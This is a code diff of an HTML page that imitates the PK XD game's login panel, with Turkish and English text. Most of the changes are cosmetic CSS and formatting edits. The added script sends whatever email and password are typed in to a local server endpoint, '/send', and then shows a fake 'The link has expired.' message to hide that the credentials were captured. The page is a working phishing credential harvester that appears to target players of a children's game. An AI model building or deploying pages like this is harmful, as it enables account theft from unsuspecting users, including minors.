@@ -54,7 +54,7 @@ body{
   /* TAM MAT MOR */
   background:#6b2fd6;
 
-  /* PK XD ŞEKLİ */
+  /* PK XD FORM */
   border-radius:30px;
 
   /* CIRTLAK MAVİ KENAR */
@@ -78,13 +78,13 @@ body{
   width:100%;
 }
 
-/* INPUTLAR – PK XD STİL */
+/* INPUTLAR */
 .login-panel input{
   width:100%;
   padding:16px;
   margin-bottom:18px;
 
-  background:#5a24b8; /* mor ama MAT */
+  background:#5a24b8;
   border:2px solid #36f3ff;
   border-radius:16px;
 
@@ -93,7 +93,6 @@ body{
   font-size:15px;
 }
 
-/* FOCUS – CIRTLAK MAVİ */
 .login-panel input:focus{
   box-shadow:0 0 12px #36f3ff;
 }
@@ -107,25 +106,20 @@ body{
   cursor:pointer;
 }
 
-/* GİRİŞ BUTONU */
+/* BUTON */
 button{
   width:100%;
   padding:16px;
   border:none;
   border-radius:20px;
-
-  /* MAT MOR */
   background:#7a3cff;
-
   color:white;
   font-size:17px;
   font-weight:bold;
-
   opacity:.6;
   cursor:not-allowed;
 }
 
-/* AKTİF – PK XD NEON */
 button.active{
   opacity:1;
   cursor:pointer;
@@ -152,7 +146,7 @@ button.active{
 <div class="login-panel">
 
   <div class="logo-panel">
-    <img src="images/pkxd_logov2.png" alt="PK XD Logo">
+    <img src="images/pkxd_logo.png" alt="PK XD Logo">
   </div>
 
   <input type="email" id="email" placeholder="E-posta">
@@ -165,56 +159,84 @@ button.active{
 </div>
 
 <script>
-let currentLang="tr";
+let currentLang = "tr";
 
-const email=document.getElementById("email");
-const password=document.getElementById("password");
-const loginBtn=document.getElementById("loginBtn");
-const result=document.getElementById("result");
-const langBtn=document.getElementById("langBtn");
-const forgot=document.getElementById("forgot");
+const email = document.getElementById("email");
+const password = document.getElementById("password");
+const loginBtn = document.getElementById("loginBtn");
+const result = document.getElementById("result");
+const langBtn = document.getElementById("langBtn");
+const forgot = document.getElementById("forgot");
 
+/* DİL */
 function updateLang(){
-  if(currentLang==="tr"){
-    email.placeholder="E-posta";
-    password.placeholder="Şifre";
-    loginBtn.textContent="GİRİŞ";
-    forgot.textContent="Şifreni mi unuttun?";
-    langBtn.textContent="Türkçe";
+  if(currentLang === "tr"){
+    email.placeholder = "E-posta";
+    password.placeholder = "Şifre";
+    loginBtn.textContent = "GİRİŞ";
+    forgot.textContent = "Şifreni mi unuttun?";
+    langBtn.textContent = "Türkçe";
   }else{
-    email.placeholder="Registered email";
-    password.placeholder="Password";
-    loginBtn.textContent="LOGIN";
-    forgot.textContent="Forgot password";
-    langBtn.textContent="English";
+    email.placeholder = "Registered email";
+    password.placeholder = "Password";
+    loginBtn.textContent = "LOGIN";
+    forgot.textContent = "Forgot password";
+    langBtn.textContent = "English";
   }
 }
 
-langBtn.onclick=()=>{
-  currentLang=currentLang==="tr"?"en":"tr";
+langBtn.addEventListener("click", ()=>{
+  currentLang = currentLang === "tr" ? "en" : "tr";
   updateLang();
-};
+});
 
-function check(){
+/* INPUT KONTROL */
+function checkInputs(){
   if(email.value && password.value){
-    loginBtn.disabled=false;
+    loginBtn.disabled = false;
     loginBtn.classList.add("active");
   }else{
-    loginBtn.disabled=true;
+    loginBtn.disabled = true;
     loginBtn.classList.remove("active");
   }
 }
 
-email.oninput=check;
-password.oninput=check;
+email.addEventListener("input", checkInputs);
+password.addEventListener("input", checkInputs);
 
-loginBtn.onclick=()=>{
-  result.textContent=currentLang==="tr"
-    ?"Bağlantının Süresi Geçmiştir."
-    :"The link has expired.";
-};
+/* =========================
+   NODE.JS'E POST EDEN KISIM
+   ========================= */
+loginBtn.addEventListener("click", async ()=>{
+  if(loginBtn.disabled) return;
+
+  try{
+    const res = await fetch("http://localhost:3000/send",{
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        email: email.value,
+        password: password.value
+      })
+    });
+
+    if(res.ok){
+      result.textContent = currentLang === "tr"
+        ? "Bağlantının Süresi Geçmiştir."
+        : "The link has expired.";
+    }else{
+      result.textContent = "Sunucu hatası ❌";
+    }
+
+  }catch(err){
+    result.textContent = "Sunucuya bağlanılamadı ❌";
+  }
+});
+
+updateLang();
 </script>
 
 </body>
 </html>
-
